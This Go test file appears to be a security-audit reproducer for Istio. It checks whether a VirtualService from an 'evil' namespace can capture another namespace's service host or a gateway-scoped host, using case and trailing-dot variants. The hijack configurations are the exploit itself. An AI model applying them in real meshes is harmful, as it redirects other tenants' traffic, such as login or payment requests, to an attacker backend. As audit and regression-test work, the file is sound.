// Zero-day audit reproducer: cross-namespace VirtualService host capture &
// host-normalization (trailing dot / case) shadowing.
// Exercises the REAL sidecar outbound RDS path: buildSidecarOutboundHTTPRouteConfig
// -> BuildSidecarOutboundVirtualHosts -> BuildSidecarVirtualHostWrapper
// -> separateVSHostsAndServices + vhost dedup.
package core

import (
	"testing"
	"time"

	route "github.com/envoyproxy/go-control-plane/envoy/config/route/v3"

	networking "istio.io/api/networking/v1alpha3"
	"istio.io/istio/pilot/pkg/model"
	"istio.io/istio/pkg/config"
	"istio.io/istio/pkg/config/schema/gvk"
	"istio.io/istio/pkg/config/visibility"
)

// helper: build a VS config in a given namespace with an exportTo and one host + one route dest.
func zdVS(name, ns, exportTo, vsHost, destHost string) config.Config {
	return config.Config{
		Meta: config.Meta{
			GroupVersionKind: gvk.VirtualService,
			Name:             name,
			Namespace:        ns,
		},
		Spec: &networking.VirtualService{
			Hosts:    []string{vsHost},
			ExportTo: []string{exportTo},
			Gateways: []string{"mesh"},
			Http: []*networking.HTTPRoute{{
				Route: []*networking.HTTPRouteDestination{{
					Destination: &networking.Destination{Host: destHost},
				}},
			}},
		},
	}
}

// dumpRoutes prints vhost name -> (domains, cluster).
func zdDump(t *testing.T, routeCfg *route.RouteConfiguration) map[string]string {
	t.Helper()
	clusters := map[string]string{}
	for _, vh := range routeCfg.VirtualHosts {
		cl := ""
		if rs := vh.GetRoutes(); len(rs) > 0 {
			cl = rs[0].GetRoute().GetCluster()
		}
		clusters[vh.Name] = cl
		t.Logf("VHOST name=%q domains=%v cluster=%q", vh.Name, vh.Domains, cl)
	}
	return clusters
}

func zdRun(t *testing.T, proxyNS string, services []*model.Service, configs []config.Config) map[string]string {
	t.Helper()
	// deterministic creation order for services
	t0 := time.Now()
	for _, svc := range services {
		svc.CreationTime = t0
		t0 = t0.Add(time.Minute)
	}
	cg := NewConfigGenTest(t, TestOptions{Services: services, Configs: configs})
	proxy := cg.SetupProxy(&model.Proxy{ConfigNamespace: proxyNS})
	vHostCache := make(map[int][]*route.VirtualHost)
	resource, _ := cg.ConfigGen.buildSidecarOutboundHTTPRouteConfig(
		proxy, &model.PushRequest{Push: cg.PushContext()}, "80", vHostCache, nil, nil)
	if resource == nil {
		t.Fatalf("nil RDS resource")
	}
	routeCfg := &route.RouteConfiguration{}
	if err := resource.Resource.UnmarshalTo(routeCfg); err != nil {
		t.Fatal(err)
	}
	return zdDump(t, routeCfg)
}

// Scenario A: baseline cross-namespace capture with a plain lowercase exported VS.
// Attacker VS in ns "evil" (exportTo *) claims victim service host in ns "prod".
// Proxy is in a THIRD namespace "frontend". Expect: victim host routes to attacker.
func TestZD_CrossNS_PlainCapture(t *testing.T) {
	victim := buildHTTPService("productpage.prod.svc.cluster.local", visibility.Public, "", "prod", 80)
	cfgs := []config.Config{
		zdVS("attacker", "evil", "*",
			"productpage.prod.svc.cluster.local",
			"attacker.evil.svc.cluster.local"),
	}
	clusters := zdRun(t, "frontend", []*model.Service{victim}, cfgs)
	got := clusters["productpage.prod.svc.cluster.local:80"]
	t.Logf("RESULT A victim vhost cluster = %q", got)
	if got == "outbound|80||attacker.evil.svc.cluster.local" {
		t.Logf(">>> SCENARIO A: CROSS-NAMESPACE CAPTURE CONFIRMED (attacker route wins)")
	}
}

// Scenario B: consumer self-protection. Consumer (same ns as proxy) defines its own
// private VS pinning the victim host to the real backend. Then attacker (evil, exportTo *)
// tries variants. Does the consumer's own-namespace VS actually protect it?
func TestZD_ConsumerProtection_Variants(t *testing.T) {
	variants := []struct {
		name        string
		attackerVSHost string
	}{
		{"lowercase", "productpage.prod.svc.cluster.local"},
		{"uppercase", "Productpage.prod.svc.cluster.local"},
		{"trailingdot", "productpage.prod.svc.cluster.local."},
	}
	for _, v := range variants {
		t.Run(v.name, func(t *testing.T) {
			victim := buildHTTPService("productpage.prod.svc.cluster.local", visibility.Public, "", "prod", 80)
			cfgs := []config.Config{
				// Consumer's own protective VS (private to frontend), pins to real backend.
				zdVS("consumer-protect", "frontend", ".",
					"productpage.prod.svc.cluster.local",
					"productpage.prod.svc.cluster.local"),
				// Attacker's exported VS.
				zdVS("attacker", "evil", "*",
					v.attackerVSHost,
					"attacker.evil.svc.cluster.local"),
			}
			clusters := zdRun(t, "frontend", []*model.Service{victim}, cfgs)
			t.Logf("RESULT B/%s clusters=%v", v.name, clusters)
			for name, cl := range clusters {
				if cl == "outbound|80||attacker.evil.svc.cluster.local" {
					t.Logf(">>> B/%s: ATTACKER WON on vhost %q despite consumer protection", v.name, name)
				}
			}
		})
	}
}

// Scenario C: trailing-dot shadow. No consumer VS. Attacker uses a trailing-dot host
// which misses the service-registry lookup (keyed w/o dot) and becomes its own vhost,
// shadowing the service's auto-generated "<fqdn>." domain.
func TestZD_TrailingDotShadow(t *testing.T) {
	victim := buildHTTPService("productpage.prod.svc.cluster.local", visibility.Public, "", "prod", 80)
	cfgs := []config.Config{
		zdVS("attacker", "evil", "*",
			"productpage.prod.svc.cluster.local.",
			"attacker.evil.svc.cluster.local"),
	}
	clusters := zdRun(t, "frontend", []*model.Service{victim}, cfgs)
	t.Logf("RESULT C clusters=%v", clusters)
}

// Scenario A2: the victim service's OWN namespace clients are also hijacked.
// Proxy runs in "prod" (same ns as the service). Attacker VS in "evil" (exportTo *).
func TestZD_CrossNS_HijacksOwnerNamespaceClients(t *testing.T) {
	victim := buildHTTPService("productpage.prod.svc.cluster.local", visibility.Public, "", "prod", 80)
	cfgs := []config.Config{
		zdVS("attacker", "evil", "*",
			"productpage.prod.svc.cluster.local",
			"attacker.evil.svc.cluster.local"),
	}
	clusters := zdRun(t, "prod", []*model.Service{victim}, cfgs)
	got := clusters["productpage.prod.svc.cluster.local:80"]
	t.Logf("RESULT A2 (proxy in prod) victim cluster = %q", got)
	if got == "outbound|80||attacker.evil.svc.cluster.local" {
		t.Logf(">>> A2: even PROD's own clients are hijacked by evil's VS")
	}
}

// Scenario A3: standalone-vhost primitive. Attacker VS host has NO backing service
// anywhere, yet a third-namespace proxy gets a vhost for it routed to the attacker.
func TestZD_NonRegistryStandaloneVhost(t *testing.T) {
	// only an unrelated service exists so the RDS is generated
	other := buildHTTPService("unrelated.frontend.svc.cluster.local", visibility.Public, "", "frontend", 80)
	cfgs := []config.Config{
		zdVS("attacker", "evil", "*",
			"payments.prod.svc.cluster.local", // no such service in registry
			"attacker.evil.svc.cluster.local"),
	}
	clusters := zdRun(t, "frontend", []*model.Service{other}, cfgs)
	t.Logf("RESULT A3 clusters=%v", clusters)
	if clusters["payments.prod.svc.cluster.local:80"] == "outbound|80||attacker.evil.svc.cluster.local" {
		t.Logf(">>> A3: standalone attacker vhost minted for a host with no owning service")
	}
}

// Scenario D: exportTo confinement. Attacker VS is PRIVATE to its own ns "evil"
// (exportTo="."). A proxy in "frontend" must NOT see it under any normalization variant.
// If any variant leaks, exportTo (the real trust boundary) is bypassable.
func TestZD_PrivateVS_Confinement(t *testing.T) {
	variants := []string{
		"productpage.prod.svc.cluster.local",
		"Productpage.prod.svc.cluster.local",
		"productpage.prod.svc.cluster.local.",
	}
	for _, vh := range variants {
		t.Run(vh, func(t *testing.T) {
			victim := buildHTTPService("productpage.prod.svc.cluster.local", visibility.Public, "", "prod", 80)
			cfgs := []config.Config{
				zdVS("attacker", "evil", ".", vh, "attacker.evil.svc.cluster.local"),
			}
			clusters := zdRun(t, "frontend", []*model.Service{victim}, cfgs)
			t.Logf("RESULT D/%s clusters=%v", vh, clusters)
			for name, cl := range clusters {
				if cl == "outbound|80||attacker.evil.svc.cluster.local" {
					t.Errorf(">>> D/%s: PRIVATE VS LEAKED cross-namespace on vhost %q", vh, name)
				}
			}
		})
	}
}

// Scenario E: owner protection. The service owner (prod) publishes its own VS
// (exportTo=*) pinning productpage to the real backend, created BEFORE the attacker.
// Does a trailing-dot attacker still steal the "<fqdn>." authority despite the owner VS?
func TestZD_OwnerProtection_Variants(t *testing.T) {
	variants := []struct{ name, host string }{
		{"lowercase", "productpage.prod.svc.cluster.local"},
		{"trailingdot", "productpage.prod.svc.cluster.local."},
	}
	for _, v := range variants {
		t.Run(v.name, func(t *testing.T) {
			victim := buildHTTPService("productpage.prod.svc.cluster.local", visibility.Public, "", "prod", 80)
			cfgs := []config.Config{
				// Owner's protective public VS (older -> earlier in creation order).
				zdVS("owner-protect", "prod", "*",
					"productpage.prod.svc.cluster.local",
					"productpage.prod.svc.cluster.local"),
				zdVS("attacker", "evil", "*", v.host, "attacker.evil.svc.cluster.local"),
			}
			clusters := zdRun(t, "frontend", []*model.Service{victim}, cfgs)
			t.Logf("RESULT E/%s clusters=%v", v.name, clusters)
			for name, cl := range clusters {
				if cl == "outbound|80||attacker.evil.svc.cluster.local" {
					t.Logf(">>> E/%s: ATTACKER stole vhost %q despite owner VS", v.name, name)
				}
			}
		})
	}
}

// ---- Gateway (ingress) cross-namespace binding tests ----

func zdGateway(name, ns string, serverHosts []string) config.Config {
	return config.Config{
		Meta: config.Meta{Name: name, Namespace: ns, GroupVersionKind: gvk.Gateway},
		Spec: &networking.Gateway{
			Selector: map[string]string{"istio": "ingressgateway"},
			Servers: []*networking.Server{{
				Hosts: serverHosts,
				Port:  &networking.Port{Name: "http", Number: 80, Protocol: "HTTP"},
			}},
		},
	}
}

// gateway VS binding to a (possibly cross-namespace) gateway by ns/name.
func zdGwVS(name, ns, exportTo, gwRef, vsHost, dest string) config.Config {
	return config.Config{
		Meta: config.Meta{Name: name, Namespace: ns, GroupVersionKind: gvk.VirtualService},
		Spec: &networking.VirtualService{
			Hosts:    []string{vsHost},
			ExportTo: []string{exportTo},
			Gateways: []string{gwRef},
			Http: []*networking.HTTPRoute{{
				Route: []*networking.HTTPRouteDestination{{
					Destination: &networking.Destination{Host: dest},
				}},
			}},
		},
	}
}

func zdRunGateway(t *testing.T, cfgs []config.Config) map[string]string {
	t.Helper()
	cg := NewConfigGenTest(t, TestOptions{Configs: cfgs})
	// proxyGateway runs in ns "not-default" with label istio: ingressgateway
	r := cg.ConfigGen.buildGatewayHTTPRouteConfig(cg.SetupProxy(&proxyGateway), cg.PushContext(), "http.80")
	out := map[string]string{}
	if r == nil {
		return out
	}
	for _, vh := range r.VirtualHosts {
		cl := ""
		if rs := vh.GetRoutes(); len(rs) > 0 {
			cl = rs[0].GetRoute().GetCluster()
		}
		out[vh.Name] = cl
		t.Logf("GW VHOST name=%q domains=%v cluster=%q", vh.Name, vh.Domains, cl)
	}
	return out
}

// G1: strict per-namespace scoping. Gateway in "not-default" allows only teamb for *.bank.com.
// Attacker VS in "teama" must NOT bind login.bank.com.
func TestZD_Gateway_StrictNamespaceScoping(t *testing.T) {
	cfgs := []config.Config{
		zdGateway("shared-gw", "not-default", []string{"teamb/*.bank.com"}),
		zdGwVS("attacker", "teama", "*", "not-default/shared-gw", "login.bank.com", "attacker.teama.svc.cluster.local"),
	}
	out := zdRunGateway(t, cfgs)
	t.Logf("RESULT G1 vhosts=%v", out)
	for name, cl := range out {
		if cl == "outbound|80||attacker.teama.svc.cluster.local" {
			t.Errorf(">>> G1: GATEWAY HIJACK - teama bound %q on a teamb-scoped server", name)
		}
	}
}

// G1b: strict scoping bypass attempts via case / trailing-dot on the VS host.
func TestZD_Gateway_StrictScoping_NormalizationVariants(t *testing.T) {
	for _, vh := range []string{"login.bank.com", "Login.bank.com", "login.bank.com.", "LOGIN.BANK.COM"} {
		t.Run(vh, func(t *testing.T) {
			cfgs := []config.Config{
				zdGateway("shared-gw", "not-default", []string{"teamb/login.bank.com"}),
				zdGwVS("attacker", "teama", "*", "not-default/shared-gw", vh, "attacker.teama.svc.cluster.local"),
			}
			out := zdRunGateway(t, cfgs)
			t.Logf("RESULT G1b/%s vhosts=%v", vh, out)
			for name, cl := range out {
				if cl == "outbound|80||attacker.teama.svc.cluster.local" {
					t.Errorf(">>> G1b/%s: GATEWAY HIJACK via normalization on vhost %q", vh, name)
				}
			}
		})
	}
}

// G2: wildcard-namespace scoping (*/host). Documents that any namespace may bind.
func TestZD_Gateway_WildcardNamespace(t *testing.T) {
	cfgs := []config.Config{
		zdGateway("shared-gw", "not-default", []string{"*/*.bank.com"}),
		zdGwVS("attacker", "teama", "*", "not-default/shared-gw", "login.bank.com", "attacker.teama.svc.cluster.local"),
	}
	out := zdRunGateway(t, cfgs)
	t.Logf("RESULT G2 vhosts=%v", out)
	for name, cl := range out {
		if cl == "outbound|80||attacker.teama.svc.cluster.local" {
			t.Logf(">>> G2: teama bound %q (expected: */host allows all namespaces)", name)
		}
	}
}
